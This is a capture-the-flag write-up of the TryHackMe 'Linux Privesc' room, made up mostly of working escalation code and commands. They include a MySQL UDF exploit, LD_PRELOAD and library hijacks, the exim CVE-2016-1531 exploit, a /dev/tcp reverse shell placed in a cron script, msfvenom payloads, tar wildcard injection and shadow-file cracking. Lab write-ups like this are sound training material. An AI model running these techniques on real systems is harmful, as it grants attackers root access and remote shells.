---
title: Writeup for TryHackMe room - Linux Privesc
author: 4n3i5v74
date: 2021-04-03 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, linux, privesc]
pin: false
---


<div class="flex-container">
  <script src="https://tryhackme.com/badge/34685"></script>
</div>


## [Linux Privesc](https://tryhackme.com/room/linuxprivesc){:target="_blank"}

This room contains detailed info about linux privilege escalation methods.

For complete tryhackme path, refer the [link](https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/){:target="_blank"}. Refer [link](https://4n3i5v74.github.io/posts/tryhackme-common-linux-privesc/){:target="_blank"} for quick reference on `linux privilege escalation`.


## Task 1 - Deploy the Vulnerable Debian VM

Use these links as references.
- [Linux Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop){:target="_blank"}


## Task 2 - Service Exploits

Use these links as references.
- [MySQL UDF exploit](https://www.exploit-db.com/exploits/1518){:target="_blank"}
- [MySQL UDF reference](https://github.com/mysqludf){:target="_blank"}

Login to the target using credentials `user:password321`.

Compile the raptor_udf2.c exploit code.
{% capture code %}{% raw %}gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc{% endraw %}{% endcapture %} {% include code.html code=code %}

The exploit code is similar to below.
{% capture code %}{% raw %}#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
    unsigned int		arg_count;	// number of arguments
    enum Item_result	*arg_type;	// pointer to item_result
    char 			**args;		// pointer to arguments
    unsigned long		*lengths;	// length of string args
    char			*maybe_null;	// 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
    char			maybe_null;	// 1 if func can return NULL
    unsigned int		decimals;	// for real functions
    unsigned long 		max_length;	// for string functions
    char			*ptr;		// free ptr for func data
    char			const_item;	// 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
    if (args->arg_count != 1)
        return(0);
    system(args->args[0]);
    return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    return(0);
}{% endraw %}{% endcapture %} {% include code.html code=code %}

Connect to `mysql` with blank password, using `mysql -u root`, and execute the following commands to create a `User Defined Function (UDF)` named `do_system` using compiled exploit.
{% capture code %}{% raw %}use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';{% endraw %}{% endcapture %} {% include code.html code=code %}

Use the function to copy `/bin/bash` to `/tmp/rootbash` and set the `suid` permission.
{% capture code %}{% raw %}select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');{% endraw %}{% endcapture %} {% include code.html code=code %}

Exit out of `mysql` shell using `\q`.

Use the newly created `bash` binary to spawn `privileged shell`.
{% capture code %}{% raw %}/tmp/rootbash -p{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 3 - Weak File Permissions - Readable /etc/shadow

The file `/etc/shadow` is readable, and if any of the password is based on dictionary word, it can be cracked easily.
{% capture code %}{% raw %}-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow{% endraw %}{% endcapture %} {% include code.html code=code %}

The entry for `root` user in `/etc/shadow` can be extracted separately for `john the ripper` and attempted to be cracked.
{% capture code %}{% raw %}root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `john` to crack the password.
{% capture code %}{% raw %}john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<password>      (root)
1g 0:00:00:00 DONE (2021-04-25 04:50) 1.265g/s 1944p/s 1944c/s 1944C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 4 - Weak File Permissions - Writable /etc/shadow

The file `/etc/shadow` is writable, and it can be exploited by manually editing any password entry.
{% capture code %}{% raw %}-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a new encrypted `sha-512` password.
{% capture code %}{% raw %}mkpasswd -m sha-512 testpwd{% endraw %}{% endcapture %} {% include code.html code=code %}

Replace the existing entry for `root` user in `/etc/shadow`.
{% capture code %}{% raw %}root:$6$9TBP0gf1$ODrD17ec0Da0SpOamlBUKdBDkzwugq1tGeB5jFPuFa.2gziqndwMmUi6EKNQ/xwajz/leHfTtrpNvC2COiOlT0:17298:0:99999:7:::{% endraw %}{% endcapture %} {% include code.html code=code %}

Switch to `root` user using password `testpwd` to validate.


## Task 5 - Weak File Permissions - Writable /etc/passwd

The file `/etc/passwd` is writable, and it can be exploited by manually editing any entry.
{% capture code %}{% raw %}-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a new encrypted password.
{% capture code %}{% raw %}openssl passwd testpwd{% endraw %}{% endcapture %} {% include code.html code=code %}

Replace the entry `*` for user `root` in the file `/etc/passwd`.
{% capture code %}{% raw %}root:Cm47jzRd1DLZU:0:0:root:/root:/bin/bash{% endraw %}{% endcapture %} {% include code.html code=code %}

Switch to `root` user using password `testpwd` to validate.


## Task 6 - Sudo - Shell Escape Sequences

Use these links as references.
- [Gtfobins reference](https://gtfobins.github.io/){:target="_blank"}

Check the sudo capabilities using `sudo -l`.
{% capture code %}{% raw %}Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more{% endraw %}{% endcapture %} {% include code.html code=code %}

The binary `iftop` can be exploited using `sudo iftop` and  executing `!/bin/sh`.

The binary `find` can be exploited using `sudo find . -exec /bin/sh \; -quit`.

The binary `vim` can be exploited using `sudo vim -c ':!/bin/sh'`.

The binary `man` can be exploited using `sudo man man` and executing `!/bin/sh`.

The binary `awk` can be exploited using `sudo awk 'BEGIN {system("/bin/sh")}'`.

The binary `nmap` can be exploited using `sudo nmap --interactive` and executing `!/bin/sh`.


## Task 7 - Sudo - Environment Variables

- LD_PRELOAD and LD_LIBRARY_PATH are inherited from user's environment.
- LD_PRELOAD loads a shared object before any others when a program is run.
- LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Check the sudo capabilities using `sudo -l`.
{% capture code %}{% raw %}Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a shared object using the exploit code, to exploit using path variable `LD_PRELOAD`.
{% capture code %}{% raw %}gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c{% endraw %}{% endcapture %} {% include code.html code=code %}

The exploit code is similar to below.
{% capture code %}{% raw %}#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}{% endraw %}{% endcapture %} {% include code.html code=code %}

Run any program allowed by `sudo`, using `sudo LD_PRELOAD=/tmp/preload.so nmap`. A `privileged shell` would be spawned.

Check what are the shared libraries used by `apache2`, using `ldd /usr/sbin/apache2`.
{% capture code %}{% raw %}linux-vdso.so.1 =>  (0x00007fff91533000)
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f51b2efb000)
libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f51b2cd7000)
libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f51b2a9d000)
libpthread.so.0 => /lib/libpthread.so.0 (0x00007f51b2881000)
libc.so.6 => /lib/libc.so.6 (0x00007f51b2515000)
libuuid.so.1 => /lib/libuuid.so.1 (0x00007f51b2310000)
librt.so.1 => /lib/librt.so.1 (0x00007f51b2108000)
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f51b1ed1000)
libdl.so.2 => /lib/libdl.so.2 (0x00007f51b1ccc000)
libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f51b1aa4000)
/lib64/ld-linux-x86-64.so.2 (0x00007f51b33b8000){% endraw %}{% endcapture %} {% include code.html code=code %}

Create a shared object using the exploit code with same name as one of the libraries mentioned above, to exploit using path variable `LD_LIBRARY_PATH`.
{% capture code %}{% raw %}gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c{% endraw %}{% endcapture %} {% include code.html code=code %}

The exploit code is similar to below.
{% capture code %}{% raw %}#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}{% endraw %}{% endcapture %} {% include code.html code=code %}

Run `apache2` to use the created library file, using `sudo LD_LIBRARY_PATH=/tmp apache2` to spawn a `privileged shell`.


## Task 8 - Cron Jobs - File Permissions

Check the current `crontab` entries.
{% capture code %}{% raw %}# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab`
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh{% endraw %}{% endcapture %} {% include code.html code=code %}

The file `overwrite.sh` is mentioned without path, and can be exploited. We can find the file location using `locate overwrite.sh`. Check the contents of the file using `cat /usr/local/bin/overwrite.sh`.
{% capture code %}{% raw %}#!/bin/bash
echo `date` > /tmp/useless{% endraw %}{% endcapture %} {% include code.html code=code %}

The file `/usr/local/bin/overwrite.sh` is also writable.
{% capture code %}{% raw %}-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh{% endraw %}{% endcapture %} {% include code.html code=code %}

The file `/usr/local/bin/overwrite.sh` can be overwritten with `reverse shell payload` to gain access.
{% capture code %}{% raw %}#!/bin/bash
bash -i >& /dev/tcp/<source-ip>/443 0>&1{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a `netcat` listener. During the next cron schedule, `reverse shell` will be spawned.
{% capture code %}{% raw %}rlwrap -cAr nc -lnvp 443{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 443)
Connection from <target-ip> 45191 received!
bash: no job control in this shell
root@debian:~#{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 9 - Cron Jobs - PATH Environment Variable

From the previous `crontab` output, the `PATH` variable output is as follows.
{% capture code %}{% raw %}PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin{% endraw %}{% endcapture %} {% include code.html code=code %}

The file `overwrite.sh` can be created newly at other location apart from `/usr/local/bin`, which has higher priority in `$PATH`. Create a file `/home/usr/overwrite.sh`.
{% capture code %}{% raw %}#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +x /tmp/rootbash{% endraw %}{% endcapture %} {% include code.html code=code %}

Make the file executable using `chmod +x /home/user/overwrite.sh` and execute it using `/tmp/rootbash -p` to spawn a `privilege shell`.


## Task 10 - Cron Jobs - Wildcards

Use these links as references.
- [Gtfobins tar](https://gtfobins.github.io/gtfobins/tar/){:target="_blank"}

From the previous `crontab` output, the file `/usr/local/bin/compress.sh` runs as user `root`, and can be exploited. Check the contents of the file.
{% capture code %}{% raw %}#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *{% endraw %}{% endcapture %} {% include code.html code=code %}

Using `msfvenom` create a reverse shell payload.
{% capture code %}{% raw %}msfvenom -p linux/x64/shell_reverse_tcp LHOST=<source-ip> LPORT=443 -f elf -o shell.elf{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell.elf{% endraw %}{% endcapture %} {% include code.html code=code %}

Copy the created `shell.elf` file to the target server using `scp shell.elf user@<ip>:/home/user/`.

Make the file executable using `chmod +x /home/user/overwrite.sh` and create following files, so when `tar` gets executed, the `reverse shell binary` will spawn a `privilege shell`.
{% capture code %}{% raw %}touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a netcat listener using `rlwrap -cAr nc -lnvp 443`, and when cron runs, `reverse shell` will be spawned.
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 443)
Connection from <target-ip> 45211 received!
bash: no job control in this shell{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 11 - SUID / SGID Executables - Known Exploits

Use these links as references.
- [Exploitdb reference](https://www.exploit-db.com/){:target="_blank"}

Find the files which are set with `suid` and `sgid` using `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`. The output will be similar to
{% capture code %}{% raw %}-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs{% endraw %}{% endcapture %} {% include code.html code=code %}

The binary `exim` can be exploited as in the [link](https://www.exploit-db.com/exploits/39535){:target="_blank"}. The file `/home/user/tools/suid/exim/cve-2016-1531.sh` can be executed to spawn a `privilege shell`.
{% capture code %}{% raw %}[ CVE-2016-1531 local root exploit
sh-4.1#{% endraw %}{% endcapture %} {% include code.html code=code %}

The exploit code is similar to below.
{% capture code %}{% raw %}#!/bin/sh
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 12 - SUID / SGID Executables - Shared Object Injection

From the previous `suid` output, the file `/usr/local/bin/suid-so` can be tried to exploit. Upon trying to execute the binary, the following output can be seen.
{% capture code %}{% raw %}Calculating something, please wait...
[=====================================================================>] 99 %
Done.{% endraw %}{% endcapture %} {% include code.html code=code %}

The binary can be debugged to find any missing libraries or links using
{% capture code %}{% raw %}strace /usr/local/bin/suid-so 2>&1 | grep -iE "open | access | no such file"`{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or
directory){% endraw %}{% endcapture %} {% include code.html code=code %}

The missing library `/home/user/.config/libcalc.so` can be tried to exploit to spawn a `privilege shell`. Create the directory `mkdir /home/user/.config` and compile a library.
{% capture code %}{% raw %}gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c{% endraw %}{% endcapture %} {% include code.html code=code %}

The exploit code is similar to below.
{% capture code %}{% raw %}#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
  setuid(0);
  system("/bin/bash -p");
}{% endraw %}{% endcapture %} {% include code.html code=code %}

The binary `/usr/local/bin/suid-so` can be executed which includes the library to spawn `privilege shell`.
{% capture code %}{% raw %}Calculating something, please wait...
bash-4.1#{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 13 - SUID / SGID Executables - Environment Variables

From the previous `suid` output, the file `/usr/local/bin/suid-env` can be tried to exploit. Upon trying to execute the binary, the following output can be seen.
{% capture code %}{% raw %}[....] Starting web server: apache2httpd (pid 1653) already running
. ok {% endraw %}{% endcapture %} {% include code.html code=code %}

The binary can be decoded to find any possible exploit using `strings /usr/local/bin/suid-env`. The output will be similar to
{% capture code %}{% raw %}/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start{% endraw %}{% endcapture %} {% include code.html code=code %}

The command `service apache2 start` does not specify path for the binary and hence can be exploited by manipulating path to include similar binary in a path which precedes.

Compile a binary which spawns a `privilege shell`.
{% capture code %}{% raw %}gcc -o service /home/user/tools/suid/service.c{% endraw %}{% endcapture %} {% include code.html code=code %}

The exploit code is similar to below.
{% capture code %}{% raw %}int main() {
  setuid(0);
  system("/bin/bash -p");
}{% endraw %}{% endcapture %} {% include code.html code=code %}

Manipulate the path variable and execute the binary to gain a `privilege shell`.
{% capture code %}{% raw %}PATH=.:$PATH /usr/local/bin/suid-env{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 14 - SUID / SGID Executables - Abusing Shell Features (#1)

In `bash` versions less than `4.2-048`, it is possible to define shell functions with names that resemble file paths, export those functions and are used instead of executable at actual file path.

From the previous `suid` output, the file `/usr/local/bin/suid-env2` can be tried to exploit. Upon trying to execute the binary, the following output can be seen.
{% capture code %}{% raw %}[....] Starting web server: apache2httpd (pid 1653) already running
. ok {% endraw %}{% endcapture %} {% include code.html code=code %}

The binary can be decoded to find any possible exploit using `strings /usr/local/bin/suid-env2`. The output will be similar to
{% capture code %}{% raw %}/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start{% endraw %}{% endcapture %} {% include code.html code=code %}

The version of `bash` can be found using `/bin/bash --version`. The output is similar to
{% capture code %}{% raw %}GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a `shell function` to spawn a `privilege shell`.
{% capture code %}{% raw %}function /usr/sbin/service { /bin/bash -p; }{% endraw %}{% endcapture %} {% include code.html code=code %}

Export the function to be made avaiable to current shell.
{% capture code %}{% raw %}export -f /usr/sbin/service{% endraw %}{% endcapture %} {% include code.html code=code %}

Execute the binary to gain a `privilege shell`.
{% capture code %}{% raw %}/usr/local/bin/suid-env2{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 15 - SUID / SGID Executables - Abusing Shell Features (#2)

In `bash` versions less than `4.4`, the environment variable `PS4` is used to display an extra prompt for debugging statements.

Enable `bash debugging` and set `PS4` variable to an embedded command. If the binary which has `suid` set is run, it will execute the embedded command before actual command execution.
{% capture code %}{% raw %}env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}/usr/sbin/service apache2 start
basename /usr/sbin/service
VERSION='service ver. 0.91-ubuntu1'
basename /usr/sbin/service
USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
SERVICE=
ACTION=
SERVICEDIR=/etc/init.d
OPTIONS=
'[' 2 -eq 0 ']'
cd /
'[' 2 -gt 0 ']'
case "${1}" in
'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
'[' 2 -eq 2 -a start = --full-restart ']'
'[' -z '' ']'
SERVICE=apache2
shift
'[' 1 -gt 0 ']'
case "${1}" in
'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
'[' 1 -eq 2 -a '' = --full-restart ']'
'[' -z apache2 ']'
'[' -z '' ']'
ACTION=start
shift
'[' 0 -gt 0 ']'
'[' -r /etc/init/apache2.conf ']'
'[' -x /etc/init.d/apache2 ']'
exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
Starting web server: apache2httpd (pid 1653) already running
.{% endraw %}{% endcapture %} {% include code.html code=code %}

Execute the binary `/tmp/rootbash -p` to spawn a `privilege shell`.


## Task 16 - Passwords & Keys - History Files

The `bash` history contains clear text of commands, and if the password is passed via command, it can be retrieved from history command and files `.bash_history` using `cat ~/.*history`.
{% capture code %}{% raw %}ls -al
cat .bash_history
ls -al
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
ifconfig
netstat -antp
nano myvpn.ovpn
ls
exit{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 17 - Passwords & Keys - Config Files

Some service and config files can store passwords in clear text, which can be easily exploited.

The vpn config file `myvpn.ovpn` stores the location of file, which stores password in clear text. It can be checked using `cat myvpn.ovpn`.
{% capture code %}{% raw %}client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0{% endraw %}{% endcapture %} {% include code.html code=code %}

The file `/etc/openvpn/auth.txt` can contain privilege account password. It can be checked using `cat /etc/openvpn/auth.txt`.
{% capture code %}{% raw %}root
<password>{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 18 - Passwords & Keys - SSH Keys

The `ssh` keys should be protected with appropriate permissions, and should not be stored elsewhere.

If the private key is readable, it can be exploited to gain `privilege shell`. The file `/.ssh/root_key` is readable.
{% capture code %}{% raw %}-----BEGIN RSA PRIVATE KEY-----
<key>
-----END RSA PRIVATE KEY-----{% endraw %}{% endcapture %} {% include code.html code=code %}

The private key can be saved locally, and can be used to spawn `privilege shell`.
{% capture code %}{% raw %}ssh -i rootkey.txt root@<ip>{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 19 - NFS

`NFS` exports should have `root squashing` enabled, so if remote user is `root`, it will be translated to `nobody` or `nfsnobody` locally.

Check if there are any `nfs` shares exported and if `root squash` is disabled, which can be exploited. This can be checked using `cat /etc/exports`.
{% capture code %}{% raw %}/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check){% endraw %}{% endcapture %} {% include code.html code=code %}

In the source machine, sudo to root, and mount the `nfs` share.
{% capture code %}{% raw %}mount -o rw,vers=2 <target-ip>:/tmp /tmp/nfs{% endraw %}{% endcapture %} {% include code.html code=code %}

Using `msfvenom, create a `reverse shell` payload.
{% capture code %}{% raw %}msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of elf file: 132 bytes
Saved as: /tmp/nfs/shell.elf{% endraw %}{% endcapture %} {% include code.html code=code %}

Make the binary executable and set `suid` flag.
{% capture code %}{% raw %}chmod +xs /tmp/nfs/shell.elf{% endraw %}{% endcapture %} {% include code.html code=code %}

In the remote machine, execute the binary `/tmp/shell.elf` to spawn a `privilge shell`.


## Task 20 - Kernel Exploits

Use these links as references.
- [Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester){:target="_blank"}


Execute the script using `perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`. The output will be similar to
{% capture code %}{% raw %}  Linux Exploit Suggester 2

Local Kernel: 2.6.32
Searching 72 exploits...

Possible Exploits
[1] american-sign-language
    CVE-2010-4347
    Source: http://www.securityfocus.com/bid/45408
[2] can_bcm
    CVE-2010-2959
    Source: http://www.exploit-db.com/exploits/14814
[3] dirty_cow
    CVE-2016-5195
    Source: http://www.exploit-db.com/exploits/40616
[4] exploit_x
    CVE-2018-14665
    Source: http://www.exploit-db.com/exploits/45697
[5] half_nelson1
    Alt: econet       CVE-2010-3848
    Source: http://www.exploit-db.com/exploits/17787
[6] half_nelson2
    Alt: econet       CVE-2010-3850
    Source: http://www.exploit-db.com/exploits/17787
[7] half_nelson3
    Alt: econet       CVE-2010-4073
    Source: http://www.exploit-db.com/exploits/17787
[8] msr
    CVE-2013-0268
    Source: http://www.exploit-db.com/exploits/27297
[9] pktcdvd
    CVE-2010-3437
    Source: http://www.exploit-db.com/exploits/15150
[10] ptrace_kmod2
    Alt: ia32syscall,robert_you_suck       CVE-2010-3301
    Source: http://www.exploit-db.com/exploits/15023
[11] rawmodePTY
    CVE-2014-0196
    Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
[12] rds
    CVE-2010-3904
    Source: http://www.exploit-db.com/exploits/15285
[13] reiserfs
    CVE-2010-1146
    Source: http://www.exploit-db.com/exploits/12130
[14] video4linux
    CVE-2010-3081
